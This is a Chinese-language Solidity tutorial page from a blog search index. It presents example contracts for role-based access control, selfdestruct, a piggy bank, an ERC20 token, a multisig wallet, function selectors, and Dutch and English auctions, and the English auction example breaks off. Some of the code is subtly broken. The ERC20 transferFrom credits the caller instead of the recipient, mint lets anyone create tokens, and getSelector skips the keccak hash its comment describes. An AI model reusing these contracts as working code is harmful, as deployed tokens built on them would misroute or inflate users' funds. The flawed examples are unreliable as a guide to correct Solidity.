<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>solidity基础知识点（三）</title>
      <link href="/2022/12/01/solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>/2022/12/01/solidity%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="solidity基础知识点（三）"><a href="#solidity基础知识点（三）" class="headerlink" title="solidity基础知识点（三）"></a>solidity基础知识点（三）</h1><h2 id="权限控制合约"><a href="#权限控制合约" class="headerlink" title="权限控制合约"></a>权限控制合约</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">contract AccessControl&#123;</span><br><span class="line">    event <span class="title function_">GrandRole</span><span class="params">(bytes32 indexed role,address indexed account)</span>;</span><br><span class="line">    event <span class="title function_">RevokeRole</span><span class="params">(bytes32 indexed role,address indexed account)</span>;</span><br><span class="line">    <span class="comment">//role=&gt;account=&gt;bool</span></span><br><span class="line">    mapping(bytes32 =&gt; mapping(address =&gt; <span class="type">bool</span>))public roles;</span><br><span class="line">    <span class="comment">//字符串的gas消耗比bytes32哈希的消耗要多的多</span></span><br><span class="line">    bytes32 private constant ADMIN=keccak256(abi.encodePacked(<span class="string">&quot;ADMIN&quot;</span>));</span><br><span class="line">    bytes32 private constant USER=keccak256(abi.encodePacked(<span class="string">&quot;USER&quot;</span>));</span><br><span class="line">    modifier <span class="title function_">onlyRole</span><span class="params">(bytes32 _role)</span>&#123;</span><br><span class="line">        require(roles[_role][msg.sender],<span class="string">&quot;not dauthorized&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    constructor()&#123;<span class="comment">//给其实账户管理员权限</span></span><br><span class="line">        _grandRole(ADMIN,msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">    function _grandRole(bytes32 _role,address _account)internal&#123;<span class="comment">//_role为ADMIN与USER</span></span><br><span class="line">        roles[_role][_account]=<span class="literal">true</span>;<span class="comment">//内部给账户权力的源代码</span></span><br><span class="line">        emit <span class="title function_">GrandRole</span><span class="params">(_role,_account)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">grandRole</span><span class="params">(bytes32 _role,address _account)</span>external <span class="title function_">onlyRole</span><span class="params">(ADMIN)</span>&#123;</span><br><span class="line">        _grandRole(_role,_account);<span class="comment">//赋予账户权限</span></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">revokeRole</span><span class="params">(bytes32 _role,address _account)</span>external <span class="title function_">onlyRole</span><span class="params">(ADMIN)</span>&#123;</span><br><span class="line">        roles[_role][_account]=<span class="literal">false</span>;<span class="comment">//撤销账户权限</span></span><br><span class="line">        emit <span class="title function_">RevokeRole</span><span class="params">(_role,_account)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自毁函数"><a href="#自毁函数" class="headerlink" title="自毁函数"></a>自毁函数</h2><p><strong>可实现强制发送主币给地址</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract Kill&#123;</span><br><span class="line">    constructor()payable&#123;&#125;</span><br><span class="line">    function <span class="title function_">kill</span><span class="params">()</span>external&#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));<span class="comment">//必须以payable标记的地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        function <span class="title function_">testCall</span><span class="params">()</span>external pure <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Helper&#123;<span class="comment">//通过这个合约来调用自毁合约</span></span><br><span class="line">    function <span class="title function_">getBalance</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">kill</span><span class="params">(Kill _kill)</span>external&#123;</span><br><span class="line">        _kill.kill();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="小猪存钱罐"><a href="#小猪存钱罐" class="headerlink" title="小猪存钱罐"></a>小猪存钱罐</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract PiggyBank&#123;</span><br><span class="line">    event <span class="title function_">Deposit</span><span class="params">(uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Withdraw</span><span class="params">(uint amount)</span>;</span><br><span class="line">    address public owner=msg.sender;</span><br><span class="line">    receive()external payable&#123;</span><br><span class="line">        emit <span class="title function_">Deposit</span><span class="params">(msg.value)</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">withdraw</span><span class="params">()</span>external &#123;</span><br><span class="line">        require(msg.sender==owner,<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Withdraw</span><span class="params">(address(this).balance)</span>;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">interface IERC20&#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//代表token总量</span></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span>external view <span class="title function_">returns</span><span class="params">(uint)</span>;<span class="comment">//代表某一账户的余额</span></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;<span class="comment">//由当前调用者发送</span></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner,address spender)</span><span class="comment">//查看批准额度</span></span><br><span class="line">        external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;<span class="comment">//批准账户额度</span></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender,address recipient,uint amount)</span></span><br><span class="line">        external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from,address indexed to,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approval</span><span class="params">(address indexed owner,address indexed spender,uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address =&gt;uint)public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint))public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint public decimals=<span class="number">18</span>;</span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient,uint amount )</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender]-=amount;</span><br><span class="line">        balanceOf[recipient]+=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender,uint amount)</span>external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[msg.sender][spender]=amount;</span><br><span class="line">        emit <span class="title function_">Approval</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address sender,address recipient,uint amount)</span></span><br><span class="line">        external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">            allowance[sender][msg.sender]-=amount;</span><br><span class="line">            balanceOf[sender]-=amount;</span><br><span class="line">            balanceOf[msg.sender]+=amount;</span><br><span class="line">            emit <span class="title function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        balanceOf[msg.sender]+=amount;</span><br><span class="line">        totalSupply+=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span>external&#123;</span><br><span class="line">        balanceOf[msg.sender]-=amount;</span><br><span class="line">        totalSupply-=amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender,address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多签钱包"><a href="#多签钱包" class="headerlink" title="多签钱包"></a>多签钱包</h2><p><strong>多个人同意之后才能转账</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">contract MultiSigWallet&#123;</span><br><span class="line">    event <span class="title function_">Deposit</span><span class="params">(address indexed sender,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Submit</span><span class="params">(uint indexed txId)</span>;<span class="comment">//提交交易申请,txId表示交易数组的索引</span></span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner,uint indexed txId)</span>;<span class="comment">//多次批准</span></span><br><span class="line">    event <span class="title function_">Revoke</span><span class="params">(address indexed owner,uint indexed txId)</span>;<span class="comment">//撤销批准</span></span><br><span class="line">    event <span class="title function_">Execute</span><span class="params">(uint indexed txId)</span>;<span class="comment">//执行</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Transaction</span>&#123;</span><span class="comment">//交易的数据</span></span><br><span class="line">        address to;</span><br><span class="line">        uint value;</span><br><span class="line">        bytes data;</span><br><span class="line">        <span class="type">bool</span> executed;<span class="comment">//是否被执行过</span></span><br><span class="line">    &#125;</span><br><span class="line">    address[]public owners;</span><br><span class="line">    mapping(address=&gt;<span class="type">bool</span>)public isOwner;</span><br><span class="line">    uint public required;</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span><span class="params">()</span>&#123;</span><br><span class="line">        require(isOwner[msg.sender],<span class="string">&quot;not owner&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">txExists</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该交易id是否存在，需要存在</span></span><br><span class="line">        require(_txId&lt;transactions.length,<span class="string">&quot;tx does not exist&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">notApproved</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该批准人是否已经批准，需未批准</span></span><br><span class="line">        require(!approved[_txId][msg.sender],<span class="string">&quot;tx already approved&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    modifier <span class="title function_">notExecuted</span><span class="params">(uint _txId)</span>&#123;<span class="comment">//该交易是否被执行过，需要未交易</span></span><br><span class="line">        require(!transactions[_txId].executed,<span class="string">&quot;tx already executed&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Transaction[]public transactions;<span class="comment">//记录所有交易</span></span><br><span class="line">    <span class="comment">//某一个交易id下某一个签名人的地址是否批准这次交易</span></span><br><span class="line"></span><br><span class="line">    mapping(uint =&gt;mapping(address=&gt;<span class="type">bool</span>))public approved;</span><br><span class="line"></span><br><span class="line">    constructor(address[]memory _owners,uint _required)&#123;</span><br><span class="line">        require(_owners.length&gt;<span class="number">0</span>,<span class="string">&quot;owners required&quot;</span>);<span class="comment">//人的个数要大于零</span></span><br><span class="line">        <span class="comment">//最少批准人的个数大于零，且小于总人数</span></span><br><span class="line">        require(_required&gt;<span class="number">0</span>&amp;&amp;_required&lt;=_owners.length,<span class="string">&quot;failed&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(uint i;i&lt;_owners.length;i++)&#123;</span><br><span class="line">            address owner=_owners[i];</span><br><span class="line">            require(owner!=address(<span class="number">0</span>),<span class="string">&quot;invalid owner&quot;</span>);<span class="comment">//检查地址是否存在</span></span><br><span class="line">            require(!isOwner[owner],<span class="string">&quot;owner is not unique&quot;</span>);<span class="comment">//检查是否重复</span></span><br><span class="line">            isOwner[owner]=<span class="literal">true</span>;</span><br><span class="line">            owners.push(owner);</span><br><span class="line">        &#125;</span><br><span class="line">        required=_required;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     receive()external payable&#123;</span><br><span class="line">            emit <span class="title function_">Deposit</span><span class="params">(msg.sender,msg.value)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">submit</span><span class="params">(address _to,uint _value,bytes calldata _data)</span></span><br><span class="line">        external onlyOwner&#123;<span class="comment">//此函数来提交交易数据</span></span><br><span class="line">            transactions.push(Transaction(&#123;</span><br><span class="line">                to: _to,</span><br><span class="line">                value: _value,</span><br><span class="line">                data: _data,</span><br><span class="line">                executed:<span class="literal">false</span></span><br><span class="line">            &#125;));</span><br><span class="line">            emit <span class="title function_">Submit</span><span class="params">(transactions.length<span class="number">-1</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(uint _txId)</span></span><br><span class="line">        external onlyOwner</span><br><span class="line">        <span class="title function_">txExists</span><span class="params">(_txId)</span><span class="comment">//判断交易id是否存在</span></span><br><span class="line">        <span class="title function_">notApproved</span><span class="params">(_txId)</span><span class="comment">//判断这个签名人是否已经批准过了</span></span><br><span class="line">        <span class="title function_">notExecuted</span><span class="params">(_txId)</span><span class="comment">//判断这个交易id是否执行过了</span></span><br><span class="line">    &#123;</span><br><span class="line">        approved[_txId][msg.sender]=<span class="literal">true</span>;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,_txId)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用来记录有多少人批准</span></span><br><span class="line">    function _getApproveCount(uint _txId)private view <span class="title function_">returns</span><span class="params">(uint count)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(uint i;i&lt;owners.length;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(approved[_txId][owners[i]]) &#123;</span><br><span class="line">               count+=<span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//用于执行最终业务，既交易</span></span><br><span class="line">    function <span class="title function_">execute</span><span class="params">(uint _txId)</span> external <span class="title function_">txExists</span><span class="params">(_txId)</span> <span class="title function_">notExecuted</span><span class="params">(_txId)</span>&#123;</span><br><span class="line">        require(_getApproveCount(_txId)&gt;=required,<span class="string">&quot;approvals &lt; required&quot;</span>);</span><br><span class="line">        Transaction storage transaction=transactions[_txId];</span><br><span class="line"></span><br><span class="line">        transaction.executed=<span class="literal">true</span>; </span><br><span class="line"></span><br><span class="line">        (<span class="type">bool</span> success,)=transaction.to.call&#123;value:transaction.value&#125;(</span><br><span class="line">            transaction.data</span><br><span class="line">        );</span><br><span class="line">        require(success,<span class="string">&quot;tx failed&quot;</span>);</span><br><span class="line">        emit <span class="title function_">Execute</span><span class="params">(_txId)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//批准人在交易前撤销自己原来的批准</span></span><br><span class="line">    function <span class="title function_">revoke</span><span class="params">(uint _txId)</span>external onlyOwner <span class="title function_">txExists</span><span class="params">(_txId)</span> <span class="title function_">notExecuted</span><span class="params">(_txId)</span>&#123;</span><br><span class="line">        require(approved[_txId][msg.sender],<span class="string">&quot;tx not approved&quot;</span>);</span><br><span class="line">        approved[_txId][msg.sender]=<span class="literal">false</span>;</span><br><span class="line">        emit <span class="title function_">Revoke</span><span class="params">(msg.sender,_txId)</span>; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="函数签名-函数的选择器"><a href="#函数签名-函数的选择器" class="headerlink" title="函数签名(函数的选择器)"></a>函数签名(函数的选择器)</h2><p><strong>EVM通过函数选择器来调用函数</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract FunctionSelector&#123;<span class="comment">//获取函数选择器</span></span><br><span class="line">    function <span class="title function_">getSelector</span><span class="params">(<span class="built_in">string</span> calldata _func)</span>external pure <span class="title function_">returns</span><span class="params">(bytes4)</span>&#123;</span><br><span class="line">        <span class="comment">//输入的_func为&quot;transfer(address,uint256)&quot;获取oxa9059cbb与下面的一样</span></span><br><span class="line">        <span class="comment">//return bytes4(keccak256(bytes(_func)));</span></span><br><span class="line">        <span class="keyword">return</span> bytes4(bytes(_func));</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> contract Receiver&#123;</span><br><span class="line">    event <span class="title function_">Log</span><span class="params">(bytes data)</span>;</span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address _to,uint _amount)</span>external&#123;</span><br><span class="line">        emit <span class="title function_">Log</span><span class="params">(msg.data)</span>;</span><br><span class="line">        <span class="comment">//msg.data:为下面三行组成</span></span><br><span class="line">        <span class="comment">//0xa9059cbb   函数的签名（选择器） [将函数的名称和类型打包后哈希然后取前四个字节]</span></span><br><span class="line">        <span class="comment">//0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4  地址参数</span></span><br><span class="line">        <span class="comment">//000000000000000000000000000000000000000000000000000000000000000b   数字残数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="荷兰拍卖"><a href="#荷兰拍卖" class="headerlink" title="荷兰拍卖"></a>荷兰拍卖</h2><p><strong>随着时间流逝，拍卖价格会越来越低，谁先举牌谁拥有拍卖物品</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721&#123;<span class="comment">//这个合约有很多东西</span></span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address _from,address _to,uint _nftId)</span>external;</span><br><span class="line">    <span class="comment">//ERC721与ERC20都必须在他们的合约中approve才能使用他们的transferFrom方法</span></span><br><span class="line">&#125;</span><br><span class="line">contract DutchAuction&#123;</span><br><span class="line">    uint private constant DURATION=<span class="number">7</span> days;</span><br><span class="line">    IERC721 public immutable nft;</span><br><span class="line">    uint public immutable nftId;</span><br><span class="line">    address payable public immutable seller;</span><br><span class="line">    uint public immutable startingPrice;</span><br><span class="line">    uint public immutable startAt;</span><br><span class="line">    uint public immutable expiresAt;</span><br><span class="line">    uint public immutable discountRate;</span><br><span class="line">    constructor(uint _startingPrice,uint _discountRate,address _nft,uint _nftId)&#123;</span><br><span class="line">        seller=payable(msg.sender);</span><br><span class="line">        startingPrice=_startingPrice;</span><br><span class="line">        discountRate=_discountRate;<span class="comment">//每秒的折扣率</span></span><br><span class="line">        startAt=block.timestamp;</span><br><span class="line">        expiresAt=block.timestamp+DURATION;</span><br><span class="line">        require(_startingPrice&gt;=_discountRate*DURATION);</span><br><span class="line">        nft=IERC721(_nft);</span><br><span class="line">        nftId=_nftId;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">getPrice</span><span class="params">()</span>public view <span class="title function_">returns</span><span class="params">(uint)</span>&#123;</span><br><span class="line">        uint timeElapsed=block.timestamp-startAt;</span><br><span class="line">        uint discount =discountRate*timeElapsed;</span><br><span class="line">        <span class="keyword">return</span> startingPrice-discount;</span><br><span class="line">    &#125;</span><br><span class="line">    function <span class="title function_">buy</span><span class="params">()</span>external payable&#123;</span><br><span class="line">        require(block.timestamp&lt;expiresAt,<span class="string">&quot;auction expired&quot;</span>);</span><br><span class="line">        uint price= getPrice();</span><br><span class="line">        require(msg.value&gt;=price,<span class="string">&quot;ETH &lt; price&quot;</span>);</span><br><span class="line">        nft.transferFrom(seller,msg.sender,nftId);</span><br><span class="line">        uint refund=msg.value-price;</span><br><span class="line">        <span class="keyword">if</span>(refund&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            payable(msg.sender).transfer(refund);</span><br><span class="line">        &#125;</span><br><span class="line">        selfdestruct(seller);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="英式拍卖"><a href="#英式拍卖" class="headerlink" title="英式拍卖"></a>英式拍卖</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">interface IERC721&#123;</span><br><span class="line">    function <span class="title function_">transferFrom</span><span class="params">(address from,address to,uint nftId)</span>external;</span><br><span class="line">&#125;</span><br><span class="line">contract EnglishAuction&#123;</span><br><span class="line">    event <span class="title function_">Bid</span><span class="params">(address indexed sender ,uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Withdraw</span><span class="params">(address indexed bidder,uint amount)</span>;</span><br><span class="line">    event 